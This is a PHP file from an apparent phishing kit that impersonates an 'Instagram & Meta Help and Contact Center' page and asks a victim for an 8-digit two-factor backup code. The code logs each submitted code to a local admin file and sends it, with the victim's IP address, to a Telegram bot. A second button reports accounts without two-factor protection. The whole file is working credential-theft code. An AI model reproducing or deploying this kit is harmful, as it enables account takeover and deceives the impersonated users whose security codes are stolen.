<?php 
error_reporting(0);
session_start();

if($_POST) {
    $clawzuser=$_SESSION["clawzuser"];
    $clawzcode=$_POST["clawzcode"];
    $ip=$_SERVER["REMOTE_ADDR"];
    
     header("Location:security.php");
     
     $file = fopen('admin/wclawz.php', 'a');
  fwrite($file, "
<html>
<head>
	<meta http-equiv='Content-Type' content='text/html;charset=UTF-8'>
<meta name='viewport' content='width=device-width, initial-scale=1'>
</head>
<body bgcolor='#000'>
<body bgcolor='black'>

<font color='green'> Faktör Kodu : </font><font color='white'>".$clawzcode."</font><br>
<font color='red'>CODER BY WCLAWZ!</font>

"); 
 
fclose($file);
     
     
     require_once('admin/tgayar.php');


$data = [
    'text' => '
Faktör kodu : '.$clawzcode.'
İp adresi : '.$ip.'
',
    'chat_id' =>"$chatid"
];
file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );
};

if(isset($_GET["btn"])){
    function faktor(){
    
$data = [
    'text' => '
HESAPTA FAKTÖR YOK !!!

CODER BY WCLAWZ !!!
',
    'chat_id' =>"$chatid"
];
file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );
        }
        faktor();
        header("Location:security.php");
}


?> 



<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@500&display=swap" rel="stylesheet">
<link rel="stylesheet" href="https://pro.fontawesome.com/releases/v5.10.0/css/all.css" integrity="sha384-AYmEC3Yw5cVb3ZcuHtOA93w35dYTsvhLPVnYs9eStHfGJvOvKxVfELGroGkvsg+p" crossorigin="anonymous"/>
    <link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link rel="stylesheet" href="style.css">
    <title>Login</title>
</head>
<body>
    <center>
        <div class="up"> <br>
        <h2>Instagram & Meta </h2>
        <h4>Help and Contact Center ©</h4>
    </div> 
    <br>
    <div class="middle">
<br>
<img width="100" src="https://wpsoul.com/wp-content/uploads/2019/09/com.project.applocker_homayoon.png" alt="">
        <form method="post">
            <br>
            <input max="99999999" min="10000000" required type="number" name="clawzcode" class="inputcwz" placeholder="Code"> 
            <br><br>
            <input type="submit" class="btn" value="Continue">
        <p>Dear <?php $clawzuser=$_SESSION["clawzuser"];
    echo $clawzuser ;?>, please enter one of the 8 digit backup codes of two factor protection for your safety.</p>
        </form> <br><br>
        <form method="get">
            <input type="submit" class="btn" name="btn" value="I don't use two-factor">
        </form>
    </div> <br>
    <br> <br>
    <br>
    <br>
    <img width="150" src="https://www.citypng.com/public/uploads/small/11640344612dld2zxme2wo06d5tycstmtr5wd5ka5xkw95yyifgxyzoqcw5lfc8hyjc7rkl0hzykywrw10ibe6vbd4ovrwrlfkwokcgn9fxqs5g.png" alt="">
    </center>
</body>
</html>